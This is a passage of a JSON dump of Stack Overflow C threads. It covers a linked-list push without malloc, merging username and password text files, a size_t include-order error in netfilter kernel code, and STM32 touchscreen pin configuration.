*/\n}\n\n/* simple print list */\nvoid prn (node_t *list)\n{\n    for (; list; list = list-&gt;next)\n        printf (\" %d\", list-&gt;val);\n    putchar ('\\n');\n}\n\nint main (void) {\n\n    node_t nodes[LMAX],                 /* array of nodes */\n        *head = nodes,                  /* list pointer */\n        singlenode = { .val = LMAX };   /* new node to push */\n\n    init(head);                 /* init list  */\n    prn (head);                 /* print list */\n\n    push (&amp;head, &amp;singlenode);  /* push new node to list */\n    prn (head);                 /* print new list */\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/lldblstatic\n 0 1 2 3 4 5 6 7 8 9\n 10 0 1 2 3 4 5 6 7 8 9\n</code></pre>\n\n<p>Look things over, paying attention to the use of addresses and pointers. If you have further questions, do not hesitate to ask.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9237024"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1035, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518043812, "creation_date": 1518030706, "last_edit_date": 1518031548, "question_id": 48671564, "link": "https://stackoverflow.com/questions/48671564/pushing-item-to-a-linked-list-c", "title": "Pushing item to a linked list (C)", "body": "<p>I am currently trying to push a struct to list, thing is I have to do this without the use of standard libraries (so no malloc, or calloc etc). Therefore I am struggling a bit, this is what I've got so far.</p>\n\n<pre><code>typedef struct node node_t;\nstruct node{\n    int val;\n    node_t *next;\n    node_t *prev;\n};\n\nnode_t nodes[10];\nnode_t blocked[10];\n\n\n\nvoid init(){\n    for(int i = 0; i &lt; 10; i++){\n        nodes[i].val = i;\n        if(i == 0){\n            nodes[i].next = &amp;nodes[i+1];\n            nodes[i].prev = NULL;\n        }\n        else if(i == 9){\n            nodes[i].next = NULL;\n            nodes[i].prev = &amp;nodes[i-1];\n        }else{\n            nodes[i].next = &amp;nodes[i+1];\n            nodes[i].prev = &amp;nodes[i-1];\n        }\n    }\n}\n\n\nnode_t *push(node_t **arr, node_t node){\n\nnode_t *newhead = &amp;node;\nprintf(\"%d\\n\", newhead-&gt;val);\nnewhead-&gt;next = (*arr);\nprintf(\"%d\\n\", (*arr)-&gt;val);\n\nreturn newhead; \n}\n\nint main(){\n\n\n    init();\n    node_t *head = &amp;nodes[0];\n\n\n    node_t *blockhead = &amp;blocked[0];\n    blockhead = push(&amp;blockhead,nodes[3]);\n    blockhead = push(&amp;blockhead,nodes[4]);\n\n\n    return 0;\n}\n</code></pre>\n\n<p>The problem I have is that the list only keeps track of the last element I've added to the list, and will crash if trying to access the next value in the list which probably means I am trying to access a NULL pointer but everything seems correct as far as I can tell, but maybe I am missing something super obvious? The point of the \"push\" function as a whole is to simply add the node to the front of the list ahead of everything else.</p>\n"}, {"tags": ["c", "file", "text"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1518029735, "post_id": 48671271, "comment_id": 84340539, "body": "Note that <code>BUFF_SIZE</code> is not used here, so you&#39;re probably failing to allocate a buffer at all. Reading character by character is going to be quite slow for anything but trivial amounts of data."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1518029754, "post_id": 48671271, "comment_id": 84340551, "body": "You&#39;re probably supposed to read <i>lines</i> from the two input files, and write them combined to the output file."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518030230, "post_id": 48671271, "comment_id": 84340842, "body": "The simple explanation is that the file names are wrong/mispelled, or the files don&#39;t exist."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1518030312, "post_id": 48671271, "comment_id": 84340889, "body": "Do error checking on each <code>fopen</code> call separately, and use <code>perror</code> instead of <code>printf</code> to print the error message.  That will tell you <i>why</i> the call failed (and which one)."}, {"owner": {"reputation": 9, "user_id": 9254716, "user_type": "registered", "profile_image": "https://graph.facebook.com/538032316541637/picture?type=large", "display_name": "Matteo Ciccozzi", "link": "https://stackoverflow.com/users/9254716/matteo-ciccozzi"}, "edited": false, "score": 0, "creation_date": 1518030749, "post_id": 48671271, "comment_id": 84341095, "body": "I found the problem, there was an extra space in the fopen function. However, the text files are not being merged."}, {"owner": {"reputation": 558, "user_id": 4207183, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-FlaU_rcEFmQ/AAAAAAAAAAI/AAAAAAAAF-Y/UVEWfvV4tKE/photo.jpg?sz=128", "display_name": "Alejandro Visiedo Garc&#237;a", "link": "https://stackoverflow.com/users/4207183/alejandro-visiedo-garc%c3%ada"}, "edited": false, "score": 0, "creation_date": 1518044625, "post_id": 48671271, "comment_id": 84348025, "body": "You are intercalating the characters from both input filenames. I suppose what you want is intercalate the lines so that, read line by line instead of character by character."}], "answers": [{"tags": [], "owner": {"reputation": 26606, "user_id": 4603670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7eabc1427aa3c8185153cc81978289a?s=128&d=identicon&r=PG&f=1", "display_name": "Barmak Shemirani", "link": "https://stackoverflow.com/users/4603670/barmak-shemirani"}, "is_accepted": true, "score": 0, "last_activity_date": 1518064448, "creation_date": 1518064448, "answer_id": 48677596, "question_id": 48671271, "link": "https://stackoverflow.com/questions/48671271/copying-usernames-and-password-from-a-file-onto-another-in-c/48677596#48677596", "title": "Copying usernames and password from a file onto another in C", "body": "<p>Reading the file one character at a time is too slow. Just read one line at a time, and write one line or two lines at a time:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(void)\n{\n    FILE *passwords = fopen(\"/Users/mcicco/Desktop/passwords.txt\", \"r\");\n    FILE *usernames = fopen(\"/Users/mcicco/Desktop/usernames.txt \", \"r\");\n    FILE *merged_file = fopen(\"/Users/mcicco/Desktop/merged.txt\" , \"w\");\n    if (usernames == NULL || passwords == NULL || merged_file == NULL)\n    {\n        printf(\"Cannot open file \\n\");\n        return (-1);\n    }\n\n    char username[1024];\n    char password[1024];\n    while(1)\n    {\n        if(!fgets(username, sizeof(username), usernames))\n            break;\n        if(!fgets(password, sizeof(password), passwords))\n            break;\n        username[strcspn(username, \"\\n\")] = 0;\n        password[strcspn(password, \"\\n\")] = 0;\n        fprintf(merged_file, \"%s\\n%s\\n\", username, password);\n    }\n    fclose(usernames);\n    fclose(passwords);\n    fclose(merged_file);    \n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1518122066, "last_edit_date": 1518122066, "creation_date": 1518082001, "answer_id": 48681897, "question_id": 48671271, "link": "https://stackoverflow.com/questions/48671271/copying-usernames-and-password-from-a-file-onto-another-in-c/48681897#48681897", "title": "Copying usernames and password from a file onto another in C", "body": "<p>the following proposed code:</p>\n\n<ol>\n<li>cleanly compiles</li>\n<li>performs the desired functionality</li>\n<li>uses <code>fgets()</code> to quickly read each line of the two input files</li>\n<li>uses <code>strchr()</code> to find any newline in the input buffer </li>\n<li>uses a simple assignment to replace any newline with a NUL byte</li>\n<li>properly checks for errors on the calls to <code>fopen()</code></li>\n<li>properly cleans up if any call to <code>fopen()</code> fails</li>\n<li>makes use of the <code>#define BUFF_SIZE</code></li>\n<li>takes into account the comments to the question.</li>\n<li>documents why each header file is included</li>\n<li>follows the axiom: <em>only one statement per line and (at most) one variable declaration per statement.</em></li>\n<li>encourages ease of readability and understanding by separating code blocks ( <code>for</code> <code>if</code> <code>else</code> <code>while</code> <code>do...while</code> <code>switch</code> <code>case</code> <code>default</code> via a single blank line</li>\n<li>makes the assumption that both of the input files contain the same number of rows </li>\n<li>makes the assumption that for a line that contains a user name, the same line on the other file contains the password</li>\n<li>makes the assumption that the desired content of the output file is: <code>username password</code></li>\n</ol>\n\n<p>and now, the proposed code.</p>\n\n<pre><code>#include &lt;stdio.h&gt;   // FILE, fopen(), fprintf(), fgets(), perror()\n#include &lt;stdlib.h&gt;  // exit(), EXIT_FAILURE\n#include &lt;string.h&gt;  // strchr()\n\n#define BUFF_SIZE 1000\n\nint main( void )\n{\n    FILE *usernames;\n    FILE *passwords;\n    FILE *merged_file;\n\n    if( NULL == (passwords = fopen(\"/Users/mcicco/Desktop/passwords.txt\", \"r\") ) )\n    {\n        perror( \"fopen to read passwords.txt failed\" );\n        exit( EXIT_FAILURE );\n    }\n\n    if( NULL == (usernames = fopen(\"/Users/mcicco/Desktop/usernames.txt\", \"r\") ) )\n    {\n        perror( \"fopen to read usernames.txt failed\" );\n        fclose( passwords );\n        exit( EXIT_FAILURE );\n    }\n\n    if( NULL == (merged_file = fopen(\"/Users/mcicco/Desktop/merged.txt\" , \"w\") ) )\n    {\n        perror( \"fopen to write merged.txt failed\" );\n        fclose( passwords );\n        fclose( usernames );\n        exit( EXIT_FAILURE );\n    }\n\n    char passwordsBuffer[ BUFF_SIZE ];\n    char usernamesBuffer[ BUFF_SIZE ];\n\n    while( fgets( passwordsBuffer, sizeof passwordsBuffer, passwords ) &amp;&amp;\n           fgets( usernamesBuffer, sizeof usernamesBuffer, usernames ) )\n    {\n        char *newline;\n        if( NULL != (newline = strchr( passwordsBuffer, '\\n' ) ) )\n        {\n            *newline = '\\0';\n        }\n\n        if( NULL != (newline = strchr( usernamesBuffer, '\\n' ) ) )\n        {\n            *newline = '\\0';\n        }\n\n        fprintf( merged_file, \"%s %s\\n\", usernamesBuffer, passwordsBuffer );\n    }\n\n    fclose(usernames);\n    fclose(passwords);\n    fclose(merged_file);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 9254716, "user_type": "registered", "profile_image": "https://graph.facebook.com/538032316541637/picture?type=large", "display_name": "Matteo Ciccozzi", "link": "https://stackoverflow.com/users/9254716/matteo-ciccozzi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 0, "accepted_answer_id": 48677596, "answer_count": 2, "score": -2, "last_activity_date": 1518122066, "creation_date": 1518029614, "last_edit_date": 1518030160, "question_id": 48671271, "link": "https://stackoverflow.com/questions/48671271/copying-usernames-and-password-from-a-file-onto-another-in-c", "title": "Copying usernames and password from a file onto another in C", "body": "<p>I have to write a c program that copies usernames and password from two different files and matches them on a third file. I don't really know how to tackle this problem. There are 20 elements in both username.txt and password.txt. I know I can use fread and fwrite to read blocks of information at a time from a text file. I tried running the program but it gives me the error cannot open file. How can I fix this issue?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#define BUFF_SIZE 1000\n\nint main()\n{\n    FILE *usernames, *passwords, *merged_file;\n    char a, c;\n    passwords = fopen(\"/Users/mcicco/Desktop/passwords.txt\", \"r\");\n    usernames = fopen(\"/Users/mcicco/Desktop/usernames.txt \", \"r\");\n    merged_file = fopen(\"/Users/mcicco/Desktop/merged.txt\" , \"w\");\n\n    if (usernames == NULL || passwords ==NULL)\n    {\n        printf(\"Cannot open file \\n\");\n        return (-1);\n    }\n\n    c = fgetc(usernames);\n    a = fgetc(passwords);\n    while (c != EOF &amp;&amp; a!= EOF)\n    {\n        fputc(c, merged_file);\n        c = fgetc(usernames);\n        fputc(a, merged_file);\n        a=fgetc(passwords);\n    }\n\n    fclose(usernames);\n    fclose(passwords);\n    fclose(merged_file);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "netfilter"], "comments": [{"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 5, "creation_date": 1518028825, "post_id": 48671044, "comment_id": 84339993, "body": "I can&#39;t see any <code>size_t</code> in your code. Try to include <code>&lt;stddef.h&gt;</code> before the other header files."}, {"owner": {"reputation": 34717, "user_id": 192910, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/de26f9c446ae47545220ff9eff3e3ef7?s=128&d=identicon&r=PG", "display_name": "Mawg says reinstate Monica", "link": "https://stackoverflow.com/users/192910/mawg-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518028890, "post_id": 48671044, "comment_id": 84340030, "body": "If you had included one of your own headers, then I would advise you to look for a mis-math (brace, quote, processor directive, etc). As it is, I can&#39;t help :-("}, {"owner": {"reputation": 34717, "user_id": 192910, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/de26f9c446ae47545220ff9eff3e3ef7?s=128&d=identicon&r=PG", "display_name": "Mawg says reinstate Monica", "link": "https://stackoverflow.com/users/192910/mawg-says-reinstate-monica"}, "reply_to_user": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 1, "creation_date": 1518028983, "post_id": 48671044, "comment_id": 84340082, "body": "@machine_1 I saw that too. I think that teh OP should post the complete error message, the one that shows <code>included from ... included from .. included from ...</code>, as that might make it obvious"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1518029003, "post_id": 48671044, "comment_id": 84340097, "body": "The relative order of <i>system</i> headers should not matter, but perhaps the kernel sources are not wholly up to speed with that."}, {"owner": {"reputation": 77, "user_id": 9329272, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/638a025af9206ac7d1e9b02099ef69ee?s=128&d=identicon&r=PG&f=1", "display_name": "Crumblez", "link": "https://stackoverflow.com/users/9329272/crumblez"}, "edited": false, "score": 1, "creation_date": 1518029075, "post_id": 48671044, "comment_id": 84340145, "body": "size_t is not mentioned anywhere in my code, I know. This looks like it&#39;s a compilation error with libraries referenced from other libraries I&#39;m using. Please find the full error messages in this imgur link <a href=\"https://imgur.com/a/nY7J3\" rel=\"nofollow noreferrer\">imgur.com/a/nY7J3</a>"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518029122, "post_id": 48671044, "comment_id": 84340176, "body": "I would expect from kernel headers to not have such a stupid mistakes..."}, {"owner": {"reputation": 77, "user_id": 9329272, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/638a025af9206ac7d1e9b02099ef69ee?s=128&d=identicon&r=PG&f=1", "display_name": "Crumblez", "link": "https://stackoverflow.com/users/9329272/crumblez"}, "edited": false, "score": 0, "creation_date": 1518029239, "post_id": 48671044, "comment_id": 84340259, "body": "okay, wow, moving the #include &lt;stddef.h&gt; to the top of the code has resolved this error it looks like. Thank you all!"}], "answers": [{"comments": [{"owner": {"reputation": 77, "user_id": 9329272, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/638a025af9206ac7d1e9b02099ef69ee?s=128&d=identicon&r=PG&f=1", "display_name": "Crumblez", "link": "https://stackoverflow.com/users/9329272/crumblez"}, "edited": false, "score": 0, "creation_date": 1518029575, "post_id": 48671223, "comment_id": 84340452, "body": "This works, thank you so much! It was such a weird error, I would not have thought of this on my own."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 77, "user_id": 9329272, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/638a025af9206ac7d1e9b02099ef69ee?s=128&d=identicon&r=PG&f=1", "display_name": "Crumblez", "link": "https://stackoverflow.com/users/9329272/crumblez"}, "edited": false, "score": 0, "creation_date": 1518029613, "post_id": 48671223, "comment_id": 84340471, "body": "The more general lesson you should learn here is that in C the order of <code>#include</code>s can matter."}], "tags": [], "owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "is_accepted": true, "score": 6, "last_activity_date": 1518029834, "last_edit_date": 1518029834, "creation_date": 1518029447, "answer_id": 48671223, "question_id": 48671044, "link": "https://stackoverflow.com/questions/48671044/getting-error-unknown-type-name-size-t-even-though-ive-included-the-relevant/48671223#48671223", "title": "Getting error unknown type name &#39;size_t&#39; even though I&#39;ve included the relevant C libraries and headers", "body": "<p>C is parsed strictly top to bottom, and <code>#include</code> does plain old textual inclusion, not anything clever that would qualify for the name of \"module import\".  Therefore, the order of <code>#include</code> directives can matter.  In this case, you're getting complaints about a type defined by <code>stddef.h</code>, so you must make sure that <code>stddef.h</code> is included <em>before</em> whatever needs it, which could be (indeed, is) another header file.</p>\n\n<p>I can reproduce the error you're getting with the following two-line source file:</p>\n\n<pre><code>#include &lt;linux/sysctl.h&gt;\n#include &lt;stddef.h&gt;\n</code></pre>\n\n<p>\u2192</p>\n\n<pre><code>$ gcc -fsyntax-only test.c\nIn file included from test.c:1:0:\n/usr/include/linux/sysctl.h:39:2: error: unknown type name \u2018size_t\u2019\n</code></pre>\n\n<p>If I exchange the order of the <code>#include</code> lines,</p>\n\n<pre><code>#include &lt;stddef.h&gt;\n#include &lt;linux/sysctl.h&gt;\n</code></pre>\n\n<p>then there is no error.  This is a bug in <code>linux/sysctl.h</code>, but I would not hold my breath for it to be fixed.  I recommend moving <code>stddef.h</code> to the very top of the include list.</p>\n\n<p>I can <em>not</em> reproduce the problem with your actual list of includes,</p>\n\n<pre><code>#include &lt;linux/netfilter_ipv4.h&gt;\n#include &lt;linux/netfilter.h&gt;\n#include &lt;linux/ip.h&gt;\n#include &lt;linux/tcp.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;stddef.h&gt;\n</code></pre>\n\n<p>but a <code>gcc -H</code> dump does not show <code>linux/sysctl.h</code> getting pulled in transitively by that set of includes, so probably it's just that I have a different version of the kernel headers on my Linux box than you do.</p>\n"}], "owner": {"reputation": 77, "user_id": 9329272, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/638a025af9206ac7d1e9b02099ef69ee?s=128&d=identicon&r=PG&f=1", "display_name": "Crumblez", "link": "https://stackoverflow.com/users/9329272/crumblez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4155, "favorite_count": 0, "accepted_answer_id": 48671223, "answer_count": 1, "score": 4, "last_activity_date": 1518029834, "creation_date": 1518028686, "question_id": 48671044, "link": "https://stackoverflow.com/questions/48671044/getting-error-unknown-type-name-size-t-even-though-ive-included-the-relevant", "title": "Getting error unknown type name &#39;size_t&#39; even though I&#39;ve included the relevant C libraries and headers", "body": "<p>Please find my code below.\nI am getting the error \"/usr/include/linux/sysctl.h:40:2: error: unknown type name \u2018size_t\u2019\"</p>\n\n<p>Searching online, the only suggestion is to make sure you have stddef.h included in your code, which I do as can be seem below. There does not appear to be a solution available outside of this fix, which I have tried, so I am currently at a loss as to how to move forward.</p>\n\n<p>Also note, this code is not pretty, but that is not the main issue with this thread. The error I am getting does not look like it is being thrown from a mistake in my code, but I may be wrong.</p>\n\n<pre><code>#include &lt;linux/netfilter_ipv4.h&gt;\n#include &lt;linux/netfilter.h&gt;\n#include &lt;linux/ip.h&gt;\n#include &lt;linux/tcp.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;stddef.h&gt;\n\nstruct nf_hook_ops{\n\n        struct list_head *list;\n\n        nf_hookfn *hook;\n\n        struct module *owner;\n\n        u_int8_t pf;\n\n        unsigned int hooknum;\n\n        int priority;    /* Hooks are ordered in ascending priority. */\n\n};\n\nint nf_register_hook(struct nf_hook_ops *reg);\n\nvoid nf_unregister_hook(struct nf_hook_ops *reg);\n\n\nstruct nf_hook_ops nfho = {\n\n    nfho.hook = hook_func_in,     \n\n    nfho.hooknum = NF_INET_LOCAL_IN,     \n\n    nfho.pf = PF_INE, \n\n    nfho.priority = NF_IP_PRI_FIRST\n};\n\nnf_register_hook(&amp;nfho);         // Register the hook\n</code></pre>\n"}, {"tags": ["c", "embedded", "microcontroller", "stm32", "touchscreen"], "answers": [{"comments": [{"owner": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518050839, "post_id": 48674647, "comment_id": 84349924, "body": "Yes, I read that application note too. But my issue is different. I need to detect the touch (first configuration) and when I configure the pins to do that (the code I provided) the pin behaviour is not what I expect. When the X- and Y+ pins are configured as input with no pull up (tristated) the signal on X+ goes to near zero. Please read the question carefully."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518076749, "post_id": 48674647, "comment_id": 84357699, "body": "@Luca : So it is a floating high impedance input; what would you expect to read?  Your question is then about electronics principles, not software, and therefore not for SO.  If your touch driver does not actually work, then you are probably asking an XY question, and not the question you need to ask."}, {"owner": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518081565, "post_id": 48674647, "comment_id": 84360549, "body": "it&#39;s a high impedance floating pin connected to an input pin with pull up resistor to Vcc. In the application you linked it says that to detect a touch I have to configure X+ as input with pullup and X- as input floating (high impedance, tristated). But when I configure the pins like that the X+ pin is automatically pulled to GND (by X-). So I would like to know how to configure the pins correctly."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518081906, "post_id": 48674647, "comment_id": 84360749, "body": "@Luca Apologies, I misread your comment.  Will think on that.  Is it perhaps the touchscreen that is pulling it down?  What is the level with the touchscreen not connected?"}, {"owner": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518084892, "post_id": 48674647, "comment_id": 84362880, "body": "@Clifford I&#39;ve disconnected the touch strip from the LCD and I&#39;m finding issues with driving the pins of the stm32f429 board. If I select two pins as input pullup, one reads 2.50V and the other 0. Same when I try to drive them as output push-pull, some are ok, some don&#39;t rise above 0.5 V. So I think the problem is with the STM32 pins."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518087943, "post_id": 48674647, "comment_id": 84365060, "body": "@Luca. It is very unlikely to be a uC problem."}, {"owner": {"reputation": 6873, "user_id": 5131711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5oP7.png?s=128&g=1", "display_name": "followed Monica to Codidact", "link": "https://stackoverflow.com/users/5131711/followed-monica-to-codidact"}, "edited": false, "score": 2, "creation_date": 1518094655, "post_id": 48674647, "comment_id": 84369479, "body": "See my answer <a href=\"https://electronics.stackexchange.com/questions/354693/interfacing-a-four-wire-resistive-touch-screen-with-stm32f429discovery/354849#354849\">over there</a>"}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518100212, "post_id": 48674647, "comment_id": 84373481, "body": "@luca : You have accepted berendi&#39;s answer on EE, and it appears it was not a software issue.  You should close this question.  Obviously the pins won&#39;t behave correctly if they are not available for use on the board!"}, {"owner": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "edited": false, "score": 0, "creation_date": 1518103078, "post_id": 48674647, "comment_id": 84375604, "body": "@Clifford yes, it was that simple, but I was overlooking it. I&#39;m closing the question."}], "tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": false, "score": 4, "last_activity_date": 1518044228, "last_edit_date": 1518044228, "creation_date": 1518043877, "answer_id": 48674647, "question_id": 48670806, "link": "https://stackoverflow.com/questions/48670806/stm32-and-4-wire-resistive-touch-screen/48674647#48674647", "title": "STM32 and 4-wire resistive touch screen", "body": "<p>Between selecting the touch event and reading the touch position, you must reconfigure the pins. The following is from an NXP application note (<a href=\"https://www.nxp.com/docs/en/application-note/AN10675.pdf\" rel=\"nofollow noreferrer\">AN10675</a>), but applies to any microcontroller and can be adapted to STM32:\n<a href=\"https://i.stack.imgur.com/zZjSI.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/zZjSI.png\" alt=\"enter image description here\"></a></p>\n\n<p>The outputs are set to provide a voltage source for the analogue measurement of the effective voltage divider formed by the touch position:</p>\n\n<p><a href=\"https://i.stack.imgur.com/O7iVG.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/O7iVG.png\" alt=\"enter image description here\"></a></p>\n\n<p>On the STM32 it is of course important not to use the GPIO configuration lock feature on these pins as you need three different configurations to read a single touch position event.</p>\n"}], "owner": {"reputation": 1369, "user_id": 4729407, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/ugk8q.jpg?s=128&g=1", "display_name": "Luca", "link": "https://stackoverflow.com/users/4729407/luca"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1638, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1518044228, "creation_date": 1518027764, "question_id": 48670806, "link": "https://stackoverflow.com/questions/48670806/stm32-and-4-wire-resistive-touch-screen", "title": "STM32 and 4-wire resistive touch screen", "body": "<p>I'm trying to interface a 4-wire resistive touchscreen to a STM32F429 Discovery board but I can't figure out how it works. I want the MCU to detect a touch so I configured the 4 pins like this:</p>\n\n<pre><code>X+ --&gt; input w/pullup connected to EXTI external interrupt \nX- --&gt; input floating (tristated)\nY+ --&gt; input floating (tristated)\nY- --&gt; output to GND\n</code></pre>\n\n<p>in this configuration I should be able to detect a touch and trigger an interrupt on the EXTI line so I can enter a ISR and sample the x and y values with the ADC. But when I connect the X- pin the X+ pin goes to near GND. It seems like current flows between X+ and 